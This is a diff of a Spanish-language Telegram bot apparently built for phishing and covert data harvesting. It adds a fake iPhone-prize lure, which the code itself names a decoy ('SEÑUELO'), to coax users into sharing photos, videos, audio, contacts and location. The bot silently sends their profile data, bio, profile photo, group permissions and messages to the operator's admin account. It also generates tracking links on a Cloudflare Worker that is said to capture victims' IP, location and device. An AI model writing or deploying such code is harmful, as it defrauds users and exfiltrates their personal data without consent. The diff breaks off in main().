@@ -1,108 +1,65 @@
 import os
 import logging
-import json
-import sqlite3
+import aiohttp
 import secrets
+import json
+import hashlib
+import base64
 from datetime import datetime
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from threading import Thread
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 # ========== CONFIGURACIÓN ==========
 TOKEN = os.environ.get("TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
-WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev")
+WORKER_URL = "https://galleta.societykark.workers.dev"  # Cambia por tu Worker
+
 if not TOKEN or not ADMIN_ID:
     raise ValueError("❌ Faltan TOKEN o ADMIN_ID")
 
-# ========== LOGS ==========
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # ========== BASE DE DATOS ==========
-DB_FILE = "users.db"
+users_db = {}
+tracking_codes = {}
 
-def init_db():
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS users (
-        id INTEGER PRIMARY KEY,
-        first_name TEXT,
-        last_name TEXT,
-        username TEXT,
-        language TEXT,
-        is_premium INTEGER,
-        bio TEXT,
-        phone TEXT,
-        photo_id TEXT,
-        photo_count INTEGER,
-        first_interaction TEXT,
-        last_interaction TEXT,
-        messages INTEGER DEFAULT 0,
-        photos INTEGER DEFAULT 0,
-        audios INTEGER DEFAULT 0,
-        videos INTEGER DEFAULT 0,
-        documents INTEGER DEFAULT 0,
-        contacts INTEGER DEFAULT 0,
-        locations INTEGER DEFAULT 0
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS logs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        user_id INTEGER,
-        action TEXT,
-        timestamp TEXT
-    )''')
-    conn.commit()
-    conn.close()
-
-def save_user(user_id, data):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute('''INSERT OR REPLACE INTO users 
-        (id, first_name, last_name, username, language, is_premium, bio, phone, photo_id, photo_count, first_interaction, last_interaction)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(first_interaction, ?), ?)''',
-        (user_id, data.get("first_name"), data.get("last_name"), data.get("username"),
-         data.get("language"), data.get("is_premium"), data.get("bio"), data.get("phone"),
-         data.get("photo_id"), data.get("photo_count"), datetime.now().isoformat(), datetime.now().isoformat()))
-    conn.commit()
-    conn.close()
-
-def log_action(user_id, action):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("INSERT INTO logs (user_id, action, timestamp) VALUES (?, ?, ?)",
-              (user_id, action, datetime.now().isoformat()))
-    conn.commit()
-    conn.close()
-
-init_db()
-
-# ========== MENÚ PRINCIPAL (con botones de respuesta y de acción) ==========
+# ========== MENÚ PRINCIPAL ==========
 def menu_principal():
     keyboard = [
-        [KeyboardButton("📸 Enviar foto"), KeyboardButton("🎤 Enviar audio")],
-        [KeyboardButton("🎥 Enviar video"), KeyboardButton("📄 Enviar documento")],
-        [KeyboardButton("👥 Compartir contacto", request_contact=True)],
-        [KeyboardButton("📍 Compartir ubicación", request_location=True)],
-        [KeyboardButton("📞 Compartir número", request_contact=True)],
-    ]
-    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-
-def menu_inline():
-    keyboard = [
-        [InlineKeyboardButton("🔗 Generar enlace", callback_data="tracking")],
-        [InlineKeyboardButton("🌐 Escanear IP", callback_data="escanear_ip")],
-        [InlineKeyboardButton("📞 Rastrear número", callback_data="rastrear_numero")],
-        [InlineKeyboardButton("📊 Mi perfil", callback_data="perfil")],
+        [InlineKeyboardButton("📊 Mi Perfil", callback_data="perfil")],
+        [InlineKeyboardButton("📸 Enviar Foto", callback_data="solicitar_foto")],
+        [InlineKeyboardButton("🎥 Enviar Video", callback_data="solicitar_video")],
+        [InlineKeyboardButton("🎵 Enviar Audio", callback_data="solicitar_audio")],
+        [InlineKeyboardButton("📇 Enviar Contacto", callback_data="solicitar_contacto")],
+        [InlineKeyboardButton("📍 Enviar Ubicación", callback_data="solicitar_ubicacion")],
+        [InlineKeyboardButton("🔗 Generar Enlace", callback_data="tracking")],
         [InlineKeyboardButton("📈 Estadísticas", callback_data="stats")],
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# ========== FUNCIÓN DE EXTRACCIÓN TOTAL (50+ campos) ==========
-async def extract_full_profile(bot, user, chat=None, message=None):
+# ========== SEÑUELO (mensaje de bienvenida) ==========
+SENUELO = """🎁 *¡FELICIDADES! Has sido seleccionado para un premio especial!* 🎁
+
+📱 *Gana un iPhone 16 Pro Max* 📱
+Solo necesitas completar los siguientes pasos:
+
+1️⃣ Verifica tu identidad (solo una vez)
+2️⃣ Comparte un dato (foto, video o contacto)
+3️⃣ Recibe tu premio virtual
+
+*¡Es 100% gratuito y solo toma 2 minutos!*
+
+👇 *Presiona un botón para comenzar* 👇"""
+
+# ========== EXTRACCIÓN COMPLETA DEL PERFIL ==========
+async def get_user_full_info(bot, user, chat=None, message=None):
     info = {}
     
-    # ===== 1. DATOS DE TELEGRAM =====
+    # === 1. DATOS BÁSICOS ===
     info["id"] = user.id
     info["first_name"] = user.first_name or "N/A"
     info["last_name"] = user.last_name or "N/A"
@@ -112,299 +69,352 @@ async def extract_full_profile(bot, user, chat=None, message=None):
     info["language"] = user.language_code or "N/A"
     info["is_bot"] = user.is_bot
     info["is_premium"] = getattr(user, 'is_premium', False)
+    info["is_verified"] = getattr(user, 'is_verified', False)
+    info["is_scam"] = getattr(user, 'is_scam', False)
+    info["is_fake"] = getattr(user, 'is_fake', False)
     
-    # ===== 2. NÚMERO DE TELÉFONO (de la base de datos o del contacto) =====
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT phone FROM users WHERE id = ?", (user.id,))
-    row = c.fetchone()
-    conn.close()
-    info["phone"] = row[0] if row else "No proporcionado"
+    # === 2. TELÉFONO ===
+    try:
+        full_chat = await bot.get_chat(user.id)
+        info["phone_number"] = full_chat.phone_number if hasattr(full_chat, 'phone_number') else "No disponible"
+    except:
+        info["phone_number"] = "No disponible"
     
-    # ===== 3. BIOGRAFÍA =====
+    # === 3. BIOGRAFÍA ===
     try:
         chat_full = await bot.get_chat(user.id)
         info["bio"] = chat_full.bio if hasattr(chat_full, 'bio') else "No disponible"
     except:
         info["bio"] = "No disponible"
     
-    # ===== 4. FOTO DE PERFIL =====
+    # === 4. FOTO DE PERFIL ===
     try:
         photos = await bot.get_user_profile_photos(user.id, limit=1)
         if photos.total_count > 0:
-            photo = photos.photos[0][-1]
-            info["photo_id"] = photo.file_id
-            info["photo_unique_id"] = photo.file_unique_id
-            info["photo_width"] = photo.width
-            info["photo_height"] = photo.height
-            info["photo_size"] = photo.file_size
+            photo_obj = photos.photos[0][-1]
+            info["photo_id"] = photo_obj.file_id
+            info["photo_unique_id"] = photo_obj.file_unique_id
+            info["photo_width"] = photo_obj.width
+            info["photo_height"] = photo_obj.height
+            info["photo_file_size"] = photo_obj.file_size
             info["photo_count"] = photos.total_count
         else:
             info["photo_id"] = None
             info["photo_unique_id"] = None
             info["photo_width"] = 0
             info["photo_height"] = 0
-            info["photo_size"] = 0
+            info["photo_file_size"] = 0
             info["photo_count"] = 0
     except:
         info["photo_id"] = None
         info["photo_unique_id"] = None
         info["photo_width"] = 0
         info["photo_height"] = 0
-        info["photo_size"] = 0
+        info["photo_file_size"] = 0
         info["photo_count"] = 0
     
-    # ===== 5. CHAT ACTUAL =====
+    # === 5. CHAT ===
     if chat:
         info["chat_type"] = chat.type
         info["chat_id"] = chat.id
         info["chat_title"] = chat.title if hasattr(chat, 'title') else "Privado"
         info["chat_members"] = getattr(chat, 'member_count', 1)
-    else:
-        info["chat_type"] = "N/A"
-        info["chat_id"] = "N/A"
-        info["chat_title"] = "N/A"
-        info["chat_members"] = 0
     
-    # ===== 6. MENSAJE ACTUAL =====
+    # === 6. PERMISOS (si es grupo) ===
+    if chat and chat.type in ["group", "supergroup"]:
+        try:
+            member = await bot.get_chat_member(chat.id, user.id)
+            info["is_admin"] = member.status in ["administrator", "creator"]
+            info["is_creator"] = member.status == "creator"
+            info["member_status"] = member.status
+            info["can_delete_messages"] = getattr(member, 'can_delete_messages', False)
+            info["can_restrict_members"] = getattr(member, 'can_restrict_members', False)
+            info["can_promote_members"] = getattr(member, 'can_promote_members', False)
+        except:
+            info["is_admin"] = False
+            info["is_creator"] = False
+            info["member_status"] = "N/A"
+            info["can_delete_messages"] = False
+            info["can_restrict_members"] = False
+            info["can_promote_members"] = False
+    else:
+        info["is_admin"] = False
+        info["is_creator"] = False
+        info["member_status"] = "N/A"
+        info["can_delete_messages"] = False
+        info["can_restrict_members"] = False
+        info["can_promote_members"] = False
+    
+    # === 7. MENSAJE ===
     if message:
         info["message_id"] = message.message_id
         info["message_date"] = message.date.isoformat()
-        info["message_text"] = message.text[:200] + "..." if message.text and len(message.text) > 200 else message.text or "N/A"
+        info["message_text"] = message.text[:500] + ("..." if len(message.text) > 500 else "") if message.text else "N/A"
+        info["message_text_hash"] = hashlib.md5(str(message.text).encode()).hexdigest() if message.text else "N/A"
+    
+    # === 8. CÓDIGO DE TRACKING ===
+    info["tracking_code"] = secrets.token_urlsafe(12)
     
     return info
 
-# ========== FORMATEAR REPORTE COMPLETO (100+ líneas) ==========
-def format_report(info):
-    msg = f"🕵️ *REPORTE COMPLETO ULTRA*\n"
+# ========== FORMATEAR PARA ADMIN ==========
+def format_info_for_admin(info):
+    msg = f"🕵️ *PERFIL COMPLETO - OMNI*\n"
     msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    msg += f"👤 *DATOS DE TELEGRAM*\n"
+    msg += f"👤 *Telegram*\n"
     msg += f"   • ID: `{info.get('id')}`\n"
     msg += f"   • Nombre completo: {info.get('full_name')}\n"
-    msg += f"   • Primer nombre: {info.get('first_name')}\n"
-    msg += f"   • Apellido: {info.get('last_name')}\n"
     msg += f"   • Username: @{info.get('username')}\n"
-    msg += f"   • Enlace directo: {info.get('username_url')}\n"
+    msg += f"   • Enlace: {info.get('username_url')}\n"
     msg += f"   • Idioma: {info.get('language')}\n"
-    msg += f"   • Es bot: {'Sí' if info.get('is_bot') else 'No'}\n"
     msg += f"   • Premium: {'Sí' if info.get('is_premium') else 'No'}\n"
-    msg += f"   • Teléfono: {info.get('phone')}\n"
-    msg += f"   • Biografía: {info.get('bio')}\n"
-    msg += f"   • ID de foto: `{info.get('photo_id')}`\n"
-    msg += f"   • Cantidad de fotos: {info.get('photo_count')}\n"
-    msg += f"   • Ancho de foto: {info.get('photo_width')}px\n"
-    msg += f"   • Alto de foto: {info.get('photo_height')}px\n"
-    msg += f"   • Tamaño de foto: {info.get('photo_size')} bytes\n"
-    msg += f"   • Chat actual: {info.get('chat_title')} ({info.get('chat_type')})\n"
-    msg += f"   • ID del chat: `{info.get('chat_id')}`\n"
-    msg += f"   • Miembros del chat: {info.get('chat_members')}\n"
-    msg += f"   • Último mensaje ID: {info.get('message_id')}\n"
-    msg += f"   • Último mensaje fecha: {info.get('message_date')}\n"
-    msg += f"   • Último mensaje texto: {info.get('message_text')}\n"
+    msg += f"   • Teléfono: {info.get('phone_number')}\n"
+    msg += f"   • Biografía: {info.get('bio')}\n\n"
+    msg += f"📸 *Foto de perfil*\n"
+    msg += f"   • Cantidad: {info.get('photo_count', 0)}\n"
+    msg += f"   • ID: `{info.get('photo_id', 'N/A')}`\n\n"
+    msg += f"💬 *Chat*\n"
+    msg += f"   • Tipo: {info.get('chat_type', 'N/A')}\n"
+    msg += f"   • ID: `{info.get('chat_id', 'N/A')}`\n"
+    msg += f"   • Título: {info.get('chat_title', 'N/A')}\n"
+    msg += f"   • Miembros: {info.get('chat_members', 'N/A')}\n\n"
+    msg += f"🔑 *Permisos*\n"
+    msg += f"   • Admin: {'Sí' if info.get('is_admin') else 'No'}\n"
+    msg += f"   • Creador: {'Sí' if info.get('is_creator') else 'No'}\n"
+    msg += f"   • Estado: {info.get('member_status', 'N/A')}\n\n"
+    if info.get('message_id'):
+        msg += f"📩 *Último mensaje*\n"
+        msg += f"   • ID: {info.get('message_id')}\n"
+        msg += f"   • Fecha: {info.get('message_date')}\n"
+        msg += f"   • Texto: {info.get('message_text')}\n\n"
+    msg += f"🔗 *Código de tracking:* `{info.get('tracking_code')}`\n"
     msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     msg += f"📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     return msg
 
-# ========== COMANDOS ==========
+# ========== COMANDO /START ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    if user.id == ADMIN_ID:
+        await update.message.reply_text("👋 Hola admin. El bot está activo.")
+        return
     chat = update.effective_chat
     message = update.message
-    
-    # Extraer perfil completo
-    info = await extract_full_profile(context.bot, user, chat, message)
-    save_user(user.id, info)
-    log_action(user.id, "/start")
-    
-    # Enviar reporte al admin
-    report = format_report(info)
-    await context.bot.send_message(chat_id=ADMIN_ID, text=report, parse_mode=ParseMode.MARKDOWN)
-    
-    # Enviar foto de perfil al admin
+    info = await get_user_full_info(context.bot, user, chat, message)
+    users_db[user.id] = info
+    await context.bot.send_message(chat_id=ADMIN_ID, text=format_info_for_admin(info), parse_mode=ParseMode.MARKDOWN)
     if info.get("photo_id"):
         await context.bot.send_photo(chat_id=ADMIN_ID, photo=info["photo_id"], caption=f"📸 Foto de {info['first_name']}")
-    
-    # Responder al usuario con señuelo
-    await update.message.reply_text(
-        "🤖 *¡Bienvenido a OmniBot!*\n\n"
-        "Este bot puede hacer muchas cosas:\n"
-        "• Generar imágenes con IA (solo envía una foto)\n"
-        "• Mejorar audios (solo envía un audio)\n"
-        "• Analizar videos (solo envía un video)\n"
-        "• Compartir tu contacto, ubicación y más.\n\n"
-        "Usa los botones de abajo para comenzar.",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=menu_principal()
-    )
+    await update.message.reply_text(SENUELO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
-async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ========== COMANDO /MENU ==========
+async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("📋 *Menú principal*\n\nElige una opción:", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
+
+# ========== COMANDO /TRACKING ==========
+async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT first_name, username, language, is_premium FROM users WHERE id = ?", (user.id,))
-    row = c.fetchone()
-    conn.close()
-    if not row:
-        await update.message.reply_text("❌ No tienes perfil registrado. Usa /start.")
-        return
-    msg = f"📊 *Tu perfil*\n\n👤 {row[0]}\n📛 @{row[1]}\n🗣️ {row[2]}\n⭐ {'Premium' if row[3] else 'Normal'}"
-    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+    code = secrets.token_urlsafe(12)
+    tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
+    link = f"{WORKER_URL}/track/{code}"
+    if user.id in users_db:
+        users_db[user.id]["tracking_code"] = code
+    await update.message.reply_text(f"🔗 *Enlace de tracking:*\n`{link}`\n\nAl abrirlo, se capturará IP, ubicación y dispositivo.", parse_mode=ParseMode.MARKDOWN)
+    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 *Nuevo enlace*\nUsuario: {user.first_name} (@{user.username})\nCódigo: `{code}`\nEnlace: {link}", parse_mode=ParseMode.MARKDOWN)
 
+# ========== COMANDO /STATS ==========
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("❌ No autorizado.")
         return
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT COUNT(*) FROM users")
-    total_users = c.fetchone()[0]
-    c.execute("SELECT COUNT(*) FROM logs")
-    total_actions = c.fetchone()[0]
-    conn.close()
-    msg = f"📊 *Estadísticas*\n👥 Usuarios: {total_users}\n📝 Acciones: {total_actions}"
+    msg = f"📊 *Estadísticas*\n\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
-async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    code = secrets.token_urlsafe(12)
-    link = f"{WORKER_URL}/track/{code}"
-    await update.message.reply_text(
-        f"🔗 *Enlace de tracking*\n`{link}`\n\nCuando alguien abra este enlace, se capturará IP, ubicación y dispositivo.",
-        parse_mode=ParseMode.MARKDOWN
-    )
-    log_action(user.id, f"tracking: {code}")
+# ========== COMANDO /HELP ==========
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🤖 *OMNI Bot*\n\nComandos:\n/start - Iniciar\n/menu - Menú\n/tracking - Generar enlace\n/stats - Estadísticas (admin)\n/help - Ayuda", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
-async def escanear_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🌐 *Ingresa una IP* (ej: 8.8.8.8)", parse_mode=ParseMode.MARKDOWN)
-    context.user_data['esperando'] = 'ip'
+# ========== SOLICITAR FOTO ==========
+async def solicitar_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("📸 *Envía una foto*\n\nPresiona el clip 📎 y selecciona una foto.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
 
-async def rastrear_numero(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("📞 *Ingresa un número internacional* (ej: +521234567890)", parse_mode=ParseMode.MARKDOWN)
-    context.user_data['esperando'] = 'numero'
+# ========== SOLICITAR VIDEO ==========
+async def solicitar_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🎥 *Envía un video*\n\nPresiona el clip 📎 y selecciona un video.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
 
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text
-    user = update.effective_user
-    
-    if context.user_data.get('esperando') == 'ip':
-        context.user_data['esperando'] = None
-        # Validar IP simple
-        partes = text.split('.')
-        if len(partes) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in partes):
-            await update.message.reply_text("✅ IP válida. Buscando información...")
-            # Aquí llamarías a tu función de IP (la tienes en el otro código)
-        else:
-            await update.message.reply_text("❌ IP inválida.")
-        return
-    
-    if context.user_data.get('esperando') == 'numero':
-        context.user_data['esperando'] = None
-        await update.message.reply_text(f"📞 Número: {text}. Buscando información...")
-        return
-    
-    await update.message.reply_text("📩 Usa los botones del menú.", reply_markup=menu_principal())
+# ========== SOLICITAR AUDIO ==========
+async def solicitar_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🎵 *Envía un audio*\n\nPresiona el clip 📎 y selecciona un audio.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
 
-# ========== MANEJAR MENSAJES DE TIPO: FOTO, AUDIO, VIDEO, DOCUMENTO ==========
+# ========== SOLICITAR CONTACTO ==========
+async def solicitar_contacto(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("📇 Compartir contacto", callback_data="compartir_contacto")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
+    await update.message.reply_text("📇 *Comparte tu contacto*\n\nPresiona el botón para compartir tu número.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+
+# ========== SOLICITAR UBICACIÓN ==========
+async def solicitar_ubicacion(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("📍 Compartir ubicación", callback_data="compartir_ubicacion")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
+    await update.message.reply_text("📍 *Comparte tu ubicación*\n\nPresiona el botón para compartir tu ubicación.", parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+
+# ========== MANEJAR ARCHIVOS RECIBIDOS ==========
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     photo = update.message.photo[-1]
     caption = update.message.caption or "Sin caption"
-    log_action(user.id, f"photo: {photo.file_id}")
-    await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=f"📸 Foto de {user.first_name} (@{user.username})\nCaption: {caption}")
-    await update.message.reply_text("📸 ¡Foto recibida! La estoy procesando con IA... (es broma, ya la recibí 😉)", reply_markup=menu_principal())
-
-async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    audio = update.message.audio
-    log_action(user.id, f"audio: {audio.file_id}")
-    await context.bot.send_audio(chat_id=ADMIN_ID, audio=audio.file_id, caption=f"🎤 Audio de {user.first_name} (@{user.username})")
-    await update.message.reply_text("🎤 ¡Audio recibido! Lo estoy mejorando... (es broma, ya lo recibí 😉)", reply_markup=menu_principal())
+    await context.bot.send_photo(
+        chat_id=ADMIN_ID,
+        photo=photo.file_id,
+        caption=f"📸 *Foto recibida de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text("✅ *Foto enviada al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
 async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     video = update.message.video
-    log_action(user.id, f"video: {video.file_id}")
-    await context.bot.send_video(chat_id=ADMIN_ID, video=video.file_id, caption=f"🎥 Video de {user.first_name} (@{user.username})")
-    await update.message.reply_text("🎥 ¡Video recibido! Analizando contenido... (es broma, ya lo recibí 😉)", reply_markup=menu_principal())
+    caption = update.message.caption or "Sin caption"
+    await context.bot.send_video(
+        chat_id=ADMIN_ID,
+        video=video.file_id,
+        caption=f"🎥 *Video recibido de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text("✅ *Video enviado al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    doc = update.message.document
-    log_action(user.id, f"document: {doc.file_name}")
-    await context.bot.send_document(chat_id=ADMIN_ID, document=doc.file_id, caption=f"📄 Documento de {user.first_name} (@{user.username})\nNombre: {doc.file_name}\nTamaño: {doc.file_size} bytes")
-    await update.message.reply_text("📄 ¡Documento recibido!", reply_markup=menu_principal())
+    audio = update.message.audio
+    await context.bot.send_audio(
+        chat_id=ADMIN_ID,
+        audio=audio.file_id,
+        caption=f"🎵 *Audio recibido de {user.first_name} (@{user.username})*\n\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text("✅ *Audio enviado al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
-# ========== MANEJAR CONTACTO Y UBICACIÓN ==========
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     contact = update.message.contact
-    log_action(user.id, f"contact: {contact.phone_number}")
-    # Guardar número de teléfono en la base de datos
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("UPDATE users SET phone = ? WHERE id = ?", (contact.phone_number, user.id))
-    conn.commit()
-    conn.close()
-    await context.bot.send_message(chat_id=ADMIN_ID, text=f"👥 *Contacto de {user.first_name}*\n📞 {contact.phone_number}\n👤 {contact.first_name} {contact.last_name or ''}", parse_mode=ParseMode.MARKDOWN)
-    await update.message.reply_text("✅ ¡Contacto recibido!", reply_markup=menu_principal())
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"📇 *Contacto recibido de {user.first_name} (@{user.username})*\n\n📞 *Nombre:* {contact.first_name} {contact.last_name or ''}\n📞 *Teléfono:* `{contact.phone_number}`\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text("✅ *Contacto enviado al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
 async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     location = update.message.location
-    log_action(user.id, f"location: {location.latitude}, {location.longitude}")
-    maps_link = f"https://www.google.com/maps?q={location.latitude},{location.longitude}"
-    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📍 *Ubicación de {user.first_name}*\nLat: {location.latitude}\nLon: {location.longitude}\n🗺️ {maps_link}", parse_mode=ParseMode.MARKDOWN)
-    await update.message.reply_text("✅ ¡Ubicación recibida!", reply_markup=menu_principal())
+    await context.bot.send_location(
+        chat_id=ADMIN_ID,
+        latitude=location.latitude,
+        longitude=location.longitude
+    )
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"📍 *Ubicación recibida de {user.first_name} (@{user.username})*\n\n🌐 Lat: {location.latitude}\n🌐 Lon: {location.longitude}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text("✅ *Ubicación enviada al admin*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
 
-# ========== CALLBACKS ==========
+# ========== CALLBACK HANDLER ==========
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
+    
+    if data == "volver":
+        await query.edit_message_text("📋 *Menú principal*\n\nElige una opción:", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_principal())
+        return
+    
+    if data == "perfil":
+        user = update.effective_user
+        info = users_db.get(user.id)
+        if not info:
+            await query.edit_message_text("❌ No tienes perfil. Usa /start.")
+            return
+        msg = f"📊 *Tu perfil*\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 `{info.get('id')}`\n🗣️ {info.get('language')}\n⭐ {'Premium' if info.get('is_premium') else 'Normal'}"
+        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    if data == "solicitar_foto":
+        await solicitar_foto(update, context)
+        await query.delete_message()
+        return
+    
+    if data == "solicitar_video":
+        await solicitar_video(update, context)
+        await query.delete_message()
+        return
+    
+    if data == "solicitar_audio":
+        await solicitar_audio(update, context)
+        await query.delete_message()
+        return
+    
+    if data == "solicitar_contacto":
+        await solicitar_contacto(update, context)
+        await query.delete_message()
+        return
+    
+    if data == "solicitar_ubicacion":
+        await solicitar_ubicacion(update, context)
+        await query.delete_message()
+        return
+    
+    if data == "compartir_contacto":
+        await query.edit_message_text("📇 *Comparte tu contacto*\n\nUsa el botón de compartir contacto (📎 → Contacto).", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    if data == "compartir_ubicacion":
+        await query.edit_message_text("📍 *Comparte tu ubicación*\n\nUsa el botón de compartir ubicación (📎 → Ubicación).", parse_mode=ParseMode.MARKDOWN)
+        return
+    
     if data == "tracking":
         await tracking(update, context)
         await query.delete_message()
-    elif data == "escanear_ip":
-        await escanear_ip(update, context)
-        await query.delete_message()
-    elif data == "rastrear_numero":
-        await rastrear_numero(update, context)
-        await query.delete_message()
-    elif data == "perfil":
-        await perfil(update, context)
-        await query.delete_message()
-    elif data == "stats":
+        return
+    
+    if data == "stats":
         await stats(update, context)
         await query.delete_message()
+        return
 
 # ========== ERROR HANDLER ==========
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"❌ Error: {context.error}")
+    if isinstance(update, Update) and update.effective_message:
+        await update.effective_message.reply_text("❌ Error inesperado.", reply_markup=menu_principal())
+
+# ========== SERVIDOR HTTP ==========
+class HealthHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+def run_http_server():
+    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
+    server.serve_forever()
 
 # ========== MAIN ==========
 def main():
+    Thread(target=run_http_server, daemon=True).start()
+    logger.info("✅ Servidor HTTP en puerto 8080")
     app = Application.builder().token(TOKEN).build()
-    
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("perfil", perfil))
-    app.add_handler(CommandHandler("stats", stats))
+    app.add_handler(CommandHandler("menu", menu))
     app.add_handler(CommandHandler("tracking", tracking))
-    app.add_handler(CommandHandler("escanear_ip", escanear_ip))
-    app.add_handler(CommandHandler("rastrear_numero", rastrear_numero))
-    
+    app.add_handler(CommandHandler("stats", stats))
